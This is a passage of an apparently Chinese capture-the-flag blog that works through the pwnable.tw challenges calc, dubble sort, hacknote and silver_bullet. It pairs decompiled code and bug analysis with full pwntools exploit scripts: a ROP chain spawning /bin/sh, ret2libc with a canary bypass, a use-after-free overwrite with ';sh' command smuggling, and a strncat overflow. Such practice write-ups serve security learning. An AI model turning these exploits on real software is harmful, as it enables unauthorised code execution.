class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./calc&apos;)</span><br><span class="line">bin = ELF(&apos;./calc&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10100)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!!!!     ROPgadget --binary ./calc  --ropchain     !!!!直接生成完整的rop链，简直不要太可怕</span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = &apos;&apos;</span><br><span class="line">p+=p32(0x804967a)</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;/bin&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;//sh&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebx</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80</span><br><span class="line"></span><br><span class="line">for i in range(len(p)/4-1):</span><br><span class="line">    sh.sendline(&apos;+&apos;+str(369+i)+&apos;-&apos;+str(u32(p[i*4:i*4+4]))+&apos;+&apos;+str(u32(p[i*4+4:i*4+8])))</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><p>下面这个是相对正常的exp。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p=remote(&apos;chall.pwnable.tw&apos;,10100)</span><br><span class="line">#p=process(&quot;./calc&quot;)</span><br><span class="line">key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;+360&apos;)</span><br><span class="line">addr_bp=int(p.recv())</span><br><span class="line">addr_re=((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16</span><br><span class="line">addr_str=addr_re+20-0x100000000</span><br><span class="line">addr=361</span><br><span class="line">for i in range(5):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;+&apos;365&apos;+str(addr_str))</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(5,8):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.send(&apos;kirin&apos;+&apos;\n&apos;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><h1 id="dubble-sort"><a href="#dubble-sort" class="headerlink" title="dubble sort"></a>dubble sort</h1><p>冒泡排序，小小的漏洞，简直就是课设车祸现场hhh<br>只找到了第一个漏洞，泄露下地址，然后gg</p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  int *v4; // edi</span><br><span class="line">  unsigned int v5; // esi</span><br><span class="line">  unsigned int v6; // esi</span><br><span class="line">  int v7; // ST08_4</span><br><span class="line">  int result; // eax</span><br><span class="line">  unsigned int num; // [esp+18h] [ebp-74h]</span><br><span class="line">  int v10; // [esp+1Ch] [ebp-70h]</span><br><span class="line">  char buf; // [esp+3Ch] [ebp-50h]</span><br><span class="line">  unsigned int canary; // [esp+7Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(0x14u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(1, (int)&quot;What your name :&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40u);                        // 没有截断，泄露libc基地址</span><br><span class="line">  __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%u&quot;, &amp;num);                    //没有限制输入个数，之后能栈溢出   </span><br><span class="line">  v3 = num;</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v10;</span><br><span class="line">    v5 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(1, (int)&quot;Enter the %d number : &quot;);  </span><br><span class="line">      fflush(stdout);</span><br><span class="line">      __isoc99_scanf(&quot;%u&quot;, v4);</span><br><span class="line">      ++v5;</span><br><span class="line">      v3 = num;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v5 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  dubblesort((unsigned int *)&amp;v10, v3);         // 出人意料的没有漏洞。。。。</span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Result :&quot;);                             // print</span><br><span class="line">  if ( num )                                    </span><br><span class="line">  &#123;</span><br><span class="line">    v6 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(&amp;v10 + v6);</span><br><span class="line">      __printf_chk(1, (int)&quot;%u &quot;);</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v6 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  result = 0;</span><br><span class="line">  if ( __readgsdword(0x14u) != canary )</span><br><span class="line">    process_end();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>刚开始输入name，然后会将其打印出来，因为read没有\x00截断，所以可以泄露出栈内存泄露libc基地址。</p><p>之后在输入个数时scanf不会限制个数，所以之后排完序后会栈溢出，但是因为程序有canary保护，不知道怎么利用。</p><p>大概是因为canary &lt; system_addr &lt; binsh_addr 所以试图让排序后的canary仍然不变，system覆盖返回地址，之后在有个/bin/sh</p><p>整体思路便是ret2libc</p><p>他们不知道怎么发现的如果在排序的时候输入 +  会输出栈的内容且不退出，只知道输入abc这些字符会直接输出栈内容并退出<br>。。。之前输出的数据一直很少，没发现。。</p><p>ps:新的寻找/bin/sh的方法！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C ./libc_32.so.6|grep  /bin  -A 1</span><br></pre></td></tr></table></figure></p><p><em>而且之前的gdb还是有问题的，attach会直接终结进程，之后会找个法子用ida调试，那样子会舒服不少。</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><p>先把大佬的放上来吧。。之后自己调成功了再放自己的。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">got_off = 0x1b0000</span><br><span class="line">system_off = 0x3a940</span><br><span class="line">bin_sh_off = 0x158e8b</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;,10101)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;a&apos;*24)</span><br><span class="line">got_addr = u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr = got_addr-got_off</span><br><span class="line">system_addr = libc_addr + system_off</span><br><span class="line">bin_sh_addr = libc_addr + bin_sh_off</span><br><span class="line">p.sendline(&apos;35&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://bbs.pediy.com/thread-228226.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228226.htm</a></p><h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><p>看着好生熟悉，看了下题目，感觉是之前的UAF的题，回去看了下，果然是hhhhh，不过这次多给了个libc，去掉了之前的之前打印flag的函数、</p><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>三个功能，添加，打印，删除、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // ebx</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( idx &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = malloc(8u);                    // ptr[i]  *ptr</span><br><span class="line">                                                // </span><br><span class="line">        if ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] = sub_804862B;        // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = ptr[i];</span><br><span class="line">        v0[1] = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)ptr[i] + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;                                       // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)ptr[i] + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++idx;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int print()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  idx = atoi(&amp;buf);</span><br><span class="line">  if ( idx &lt; 0 || idx &gt;= ::idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[idx] )</span><br><span class="line">    (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int sub_80487D4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)ptr[v1] + 1));              // ptr[v1] puts指针</span><br><span class="line">                                                // ptr[v1]+1 content指针</span><br><span class="line">    free(ptr[v1]);                              // uaf</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>add 函数会分配大小为8的内存块存放puts与content的指针，因为free之后没有将其指向null，所以可以利用uaf漏洞<br>覆盖note0的指针，将其指向某got地址，print泄露真实地址，计算得到system真实地址<br>再次修改其为system地址，需要使用参数截断—system的参数即为结构体本身<br>这里需要使用system的参数截断，例如  “||sh”或者”;sh”</p><p><em>感觉正在用着残破不堪的工具。。要完了</em></p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;)</span><br><span class="line">      sh.sendline(&quot;1&quot;)</span><br><span class="line">      sh.recvuntil(&quot;size :&quot;)</span><br><span class="line"></span><br><span class="line">      sh.sendline(size)</span><br><span class="line">      sh.recvuntil(&quot;Content :&quot;)</span><br><span class="line">      sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">      sh.sendline(&quot;2&quot;) </span><br><span class="line">      sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">      sh.sendline(index) </span><br><span class="line"></span><br><span class="line">def print(index): </span><br><span class="line">    sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">    sh.sendline(&quot;3&quot;) </span><br><span class="line">    sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">    sh.sendline(index)</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./hacknote&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;, 10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">putnote=0x804862b</span><br><span class="line"></span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">delete(&apos;0&apos;)</span><br><span class="line">delete(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">add(&apos;8&apos;,p32(putnote)+p32(read_got))</span><br><span class="line">print(&apos;0&apos;) </span><br><span class="line">read_addr=u32(sh.recv()[:4])</span><br><span class="line">print hex(read_addr)</span><br><span class="line"></span><br><span class="line">sys_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;] </span><br><span class="line">delete(&apos;2&apos;) </span><br><span class="line">add(&apos;8&apos;,p32(sys_addr)+&quot;;sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">print(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="silver-bullet"><a href="#silver-bullet" class="headerlink" title="silver_bullet"></a>silver_bullet</h1><p><em>风格比较有意思的一个题目</em></p><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>三个选项:<br>1.create_bullet description最大为0x30，<br>2.power_up 若description小于0x30,最多可以增加至0x30，<br>3.beat 用上面的power beat HP为0x7fffffff的werewolf，打败便退出。</p><p>重点函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl power_up(char *bullet_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+0h] [ebp-34h]</span><br><span class="line">  size_t v3; // [esp+30h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x30u);</span><br><span class="line">  if ( !*bullet_ptr )</span><br><span class="line">    return puts(&quot;You need create the bullet first !&quot;);</span><br><span class="line">  if ( *((_DWORD *)bullet_ptr + 12) &gt; 0x2Fu )</span><br><span class="line">    return puts(&quot;You can&apos;t power up any more !&quot;);</span><br><span class="line">  printf(&quot;Give me your another description of bullet :&quot;);</span><br><span class="line">  read_input(&amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  strncat(bullet_ptr, &amp;s, 48 - *((_DWORD *)bullet_ptr + 12));</span><br><span class="line"></span><br><span class="line">  v3 = strlen(&amp;s) + *((_DWORD *)bullet_ptr + 12);</span><br><span class="line">  printf(&quot;Your new power is : %u\n&quot;, v3);</span><br><span class="line">  *((_DWORD *)bullet_ptr + 12) = v3;</span><br><span class="line">  return puts(&quot;Enjoy it !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>乍一看感觉逻辑没什么问题，寻找可能有问题的地方，最后问题在strncat上<br>因为程序的存在一个结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct bullet&#123;</span><br><span class="line">  char bullet_ptr[0x30]</span><br><span class="line">  int length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而strncat合并字符串时，合并完之后会在后面加上\x00,因为上面结构体的存在，我们就有希望覆盖length，然后再次powerup便可以溢出覆盖返回地址了。</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><p>本地测试莫名其妙过不了，但是远程没问题。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 